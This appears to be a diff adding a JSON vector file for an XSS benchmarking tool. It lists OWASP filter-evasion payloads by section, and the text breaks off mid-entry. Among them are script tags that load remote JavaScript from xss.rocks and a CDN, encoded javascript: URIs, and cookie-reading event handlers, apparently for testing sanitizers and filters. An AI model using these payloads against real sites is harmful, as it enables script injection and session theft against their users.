@@ -1,0 +1,1203 @@
+{
+  "schema": "xssbench.vectorfile.v1",
+  "meta": {
+    "tool": "xssbench",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "license": {
+      "spdx": "CC-BY-SA-4.0",
+      "url": "https://creativecommons.org/licenses/by-sa/4.0/legalcode.txt",
+      "file": "vectors/owasp-xss-filter-evasion-LICENSE.txt"
+    }
+  },
+  "vectors": [
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-basic-xss-test-without-filter-evasion-8f3dea193a",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Basic XSS Test Without Filter Evasion",
+    "payload_html": "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Basic XSS Test Without Filter Evasion"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-locator-polyglot-8fd740e9f3",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Locator (Polyglot)",
+    "payload_html": "javascript:/*--></title></style></textarea></script></xmp>\n<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>",
+    "payload_context": [
+      "href",
+      "html",
+      "js",
+      "js_string"
+    ],
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Locator (Polyglot)"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-malformed-a-tags-5b0c1863f0",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Malformed A Tags",
+    "payload_html": "\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Malformed A Tags"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-malformed-a-tags-413461bdd3",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Malformed A Tags",
+    "payload_html": "\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Malformed A Tags"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-malformed-img-tags-0d15199ca6",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Malformed IMG Tags",
+    "payload_html": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Malformed IMG Tags"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-fromcharcode-a4833ece50",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / fromCharCode",
+    "payload_html": "<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">Click Me!</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / fromCharCode"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-default-src-tag-to-get-past-filters-that-ch-52d9c7c8c7",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Default SRC Tag to Get Past Filters that Check SRC Domain",
+    "payload_html": "<IMG SRC=# onmouseover=\"alert('xxs')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Default SRC Tag to Get Past Filters that Check SRC Domain"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-default-src-tag-by-leaving-it-empty-cfe04e6677",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Default SRC Tag by Leaving it Empty",
+    "payload_html": "<IMG SRC= onmouseover=\"alert('xxs')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Default SRC Tag by Leaving it Empty"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-default-src-tag-by-leaving-it-out-entirely-3d8dd05505",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Default SRC Tag by Leaving it out Entirely",
+    "payload_html": "<IMG onmouseover=\"alert('xxs')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Default SRC Tag by Leaving it out Entirely"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-on-error-alert-d0ea98b840",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / On Error Alert",
+    "payload_html": "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / On Error Alert"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-img-onerror-and-javascript-alert-encode-081e5d7d37",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / IMG onerror and JavaScript Alert Encode",
+    "payload_html": "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / IMG onerror and JavaScript Alert Encode"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-decimal-html-character-references-e55c713995",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Decimal HTML Character References",
+    "payload_html": "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">Click Me!</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Decimal HTML Character References"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-decimal-html-character-references-without-t-27cd365c2f",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Decimal HTML Character References Without Trailing Semicolons",
+    "payload_html": "<a href=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Decimal HTML Character References Without Trailing Semicolons"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-hexadecimal-html-character-references-witho-9f20dc3ec8",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Hexadecimal HTML Character References Without Trailing Semicolons",
+    "payload_html": "<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Hexadecimal HTML Character References Without Trailing Semicolons"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-tab-544e18d608",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Tab",
+    "payload_html": "<a href=\"jav   ascript:alert('XSS');\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Tab"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-encoded-tab-afb7237da1",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Encoded Tab",
+    "payload_html": "<a href=\"jav&#x09;ascript:alert('XSS');\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Encoded Tab"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-450f2e0aea",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS",
+    "payload_html": "<a href=\"jav&#x0A;ascript:alert('XSS');\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-example-1--00e1c5ef50",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 1: Break Up XSS Attack with Embedded Carriage Return",
+    "payload_html": "<a href=\"jav&#x0D;ascript:alert('XSS');\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 1: Break Up XSS Attack with Embedded Carriage Return"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-example-2--5dfea2c063",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 2: Break Up JavaScript Directive with Null",
+    "payload_html": "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 2: Break Up JavaScript Directive with Null"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-example-3--a6c621abc6",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS",
+    "payload_html": "<a href=\" &#14;  javascript:alert('XSS');\">Click Me</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-example-4--cec536f2eb",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 4: Non-alpha-non-digit XSS",
+    "payload_html": "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 4: Non-alpha-non-digit XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-example-4--c5fc1e8c27",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 4: Non-alpha-non-digit XSS",
+    "payload_html": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+    "payload_context": "html_outer",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 4: Non-alpha-non-digit XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embedded-newline-to-break-up-xss-example-4--302aec40cb",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 4: Non-alpha-non-digit XSS",
+    "payload_html": "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Embedded Newline to Break Up XSS / Example 4: Non-alpha-non-digit XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-extraneous-open-brackets-8f6f25d5bc",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Extraneous Open Brackets",
+    "payload_html": "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Extraneous Open Brackets"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-no-closing-script-tags-91b085f05f",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / No Closing Script Tags",
+    "payload_html": "<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / No Closing Script Tags"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-protocol-resolution-in-script-tags-a8e065db13",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Protocol Resolution in Script Tags",
+    "payload_html": "<SCRIPT SRC=//xss.rocks/.j>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Protocol Resolution in Script Tags"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-half-open-html-javascript-xss-vector-944bf5574a",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Half Open HTML/JavaScript XSS Vector",
+    "payload_html": "<IMG SRC=\"`<javascript:alert>`('XSS')\"",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Half Open HTML/JavaScript XSS Vector"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-escaping-javascript-escapes-c7e8c5c19d",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Escaping JavaScript Escapes",
+    "payload_html": "\\\";alert('XSS');//",
+    "payload_context": "js_string_double",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Escaping JavaScript Escapes"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-escaping-javascript-escapes-16b1652cfe",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Escaping JavaScript Escapes",
+    "payload_html": "</script><script>alert('XSS');</script>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Escaping JavaScript Escapes"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-end-title-tag-4f98d2564d",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag",
+    "payload_html": "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-end-title-tag-input-image-d1c83c652d",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / INPUT Image",
+    "payload_html": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / INPUT Image"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-end-title-tag-body-image-2f86a29583",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / BODY Image",
+    "payload_html": "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
+    "payload_context": "html_outer",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / BODY Image"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-end-title-tag-img-dynsrc-233d4e297a",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / IMG Dynsrc",
+    "payload_html": "<IMG DYNSRC=\"javascript:alert('XSS')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / IMG Dynsrc"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-end-title-tag-img-lowsrc-b6d69d01ed",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / IMG Lowsrc",
+    "payload_html": "<IMG LOWSRC=\"javascript:alert('XSS')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / End Title Tag / IMG Lowsrc"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-list-style-image-5b66ae4320",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / List-style-image",
+    "payload_html": "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / List-style-image"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-vbscript-in-an-image-d373c2757c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / VBscript in an Image",
+    "payload_html": "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / VBscript in an Image"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-svg-object-tag-2c2f71dc78",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / SVG Object Tag",
+    "payload_html": "<svg/onload=alert('XSS')>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / SVG Object Tag"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-ecmascript-6-3a0c34440b",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / ECMAScript 6",
+    "payload_html": "Set.constructor`alert\\x28document.domain\\x29",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / ECMAScript 6"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-body-tag-aee6121aa1",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag",
+    "payload_html": "<BODY ONLOAD=alert('XSS')>",
+    "payload_context": "html_outer",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-body-tag-bgsound-75289bf344",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag / BGSOUND",
+    "payload_html": "<BGSOUND SRC=\"javascript:alert('XSS');\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag / BGSOUND"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-body-tag-javascript-includes-acd5b0a17f",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag / & JavaScript includes",
+    "payload_html": "<BR SIZE=\"&{alert('XSS')}\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag / & JavaScript includes"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-body-tag-style-sheet-a14fa6590c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag / STYLE sheet",
+    "payload_html": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / BODY Tag / STYLE sheet"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-remote-style-sheet-bf62d2dccc",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Remote style sheet",
+    "payload_html": "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Remote style sheet"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-remote-style-sheet-remote-style-sheet-part--49a0f7c2d9",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Remote style sheet / Remote style sheet part 2",
+    "payload_html": "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Remote style sheet / Remote style sheet part 2"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-remote-style-sheet-remote-style-sheet-part--938f9aaa86",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Remote style sheet / Remote style sheet part 3",
+    "payload_html": "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Remote style sheet / Remote style sheet part 3"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-style-tags-that-breaks-up-javascript-for-xs-5e1d5d441d",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Tags that Breaks Up JavaScript for XSS",
+    "payload_html": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Tags that Breaks Up JavaScript for XSS"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-style-attribute-that-breaks-up-an-expressio-a57f60b9dc",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Attribute that Breaks Up an Expression",
+    "payload_html": "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Attribute that Breaks Up an Expression"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-img-style-with-expressions-91ca3f04b1",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / IMG STYLE with Expressions",
+    "payload_html": "exp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / IMG STYLE with Expressions"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-style-tag-using-background-image-e968c83781",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Tag using Background-image",
+    "payload_html": "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Tag using Background-image"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-style-tag-using-background-7699908cbe",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Tag using Background",
+    "payload_html": "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / STYLE Tag using Background"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-anonymous-html-with-style-attribute-6a1a6e3e41",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Anonymous HTML with STYLE Attribute",
+    "payload_html": "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Anonymous HTML with STYLE Attribute"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-local-htc-file-fa3fa8eee8",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Local htc File",
+    "payload_html": "<XSS STYLE=\"behavior: url(xss.htc);\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Local htc File"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-us-ascii-encoding-93673894d6",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / US-ASCII Encoding",
+    "payload_html": "¼script¾alert(¢XSS¢)¼/script¾",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
